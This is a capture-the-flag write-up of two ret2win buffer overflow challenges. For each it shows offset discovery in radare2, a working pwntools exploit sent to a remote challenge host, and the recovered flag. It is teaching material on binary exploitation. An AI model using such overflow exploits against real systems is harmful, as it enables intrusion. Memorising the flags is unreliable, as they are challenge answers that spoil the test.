# 1. Property in Manipal

## Solution:

After decompiling the binary, we see three functions: `main`, `vuln` and `win`. This looks like a classic ret2win challenge.
I copied a 150 character De Bruijn sequence into my clipboard directly using `ragg2 -P 150 -r | wl-copy`. 
Next I opened the binary in `radare2` using `r2 -d -A manipal` and run `dc` (debug continue) to start execution. We paste the De Bruijn Sequence in the second input, since it's using a simple `gets()` function that does not perform out of bounds checking.
```console
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
96565
[0x7f14c1e61b40]> dc
I bought a property in Mandavi
& what they do for you is,
they give you the property.
Enter your name to signup for the property: Gaurav
Hello, Gaurav

Enter the amount for customizations: AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAA
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 si_pid=0 ret=0
```
Next we determine the offset needed using the `wopO` command along with the address of the `rsp` register.
```console
wopO `pv @ rsp`
72
```

The reason we use the `rsp` register and not something like `rip` is because on 64-bit machines, the CPU performs canonical checks to see if it's an actually valid memory location. When we overflow the return address location with `0x4141414141414141`, the CPU rejects it and does not move it into the `rip` register when the `ret` instruction is called (The `ret` instruction tries to pop the return address at the stack onto `rip`). But the `rsp` register still holds our invalid address perfectly fine, which is why we use it.

So, now that the offset is known it's a simple matter of making the script to exploit it. We use the `ret_gadget` to fix stack alignment problems created when overwriting the return address.

```python
from pwn import *

# p = process("./manipal")
p = remote('propertyinmanipal.nitephase.live', 42586)

# payload += p64(0x00401196)
elf = ELF("./manipal")
rop = ROP(elf)
addr = elf.symbols['win']
ret_gadget = rop.find_gadget(['ret'])[0]

payload = b'A' * 72 + p64(ret_gadget) + p64(addr)

p.sendlineafter(b"property:", b"Gaurav")
p.sendlineafter(b"customizations:", payload)
p.interactive()
```

## Flag:

```
nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
```

## Concepts learnt:

- Buffer Overflow attacks
- Finding offsets
- Using the `pwn` python module
- Using `radare2` 

## Notes:

- Took some time figuring out how to adapt ir0nstone's guide to 64-bit binaries.

## Resources:

- https://ir0nstone.gitbook.io/notes/binexp/stack/introduction


***

# 2. Performative

## Solution:

Another ret2win challenge, similar to the previous ones. Steps remain the same.
Finding offset:
```console
r2 -d -A perf
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Skipping type matching analysis in debugger mode (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Integrate dwarf function information
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x7f587d2ceb40]> dc
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAA
Generating your buffer...

Your custom buffer:
========================
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAA
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 si_pid=0 ret=0
[0x004013b2]> wopO `pv @ rsp`
40
```

Script:
```python
from pwn import *

elf = ELF("./perf")
rop = ROP(elf)

# p = process("./perf")
p = remote("performative.nitephase.live", 56743)

ret_gadget = rop.find_gadget(['ret'])[0]
addr = elf.symbols['win']
payload = b'A' * 40 + p64(ret_gadget) + p64(addr)

p.sendlineafter(b"Buffer: ", payload)
p.interactive()
```
## Flag:

```
nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```
## Concepts learnt:

- Buffer Overflow attacks
- Finding offsets
- Using the `pwn` python module
- Using `radare2` 
## Resources:

- https://ir0nstone.gitbook.io/notes/binexp/stack/introduction


***

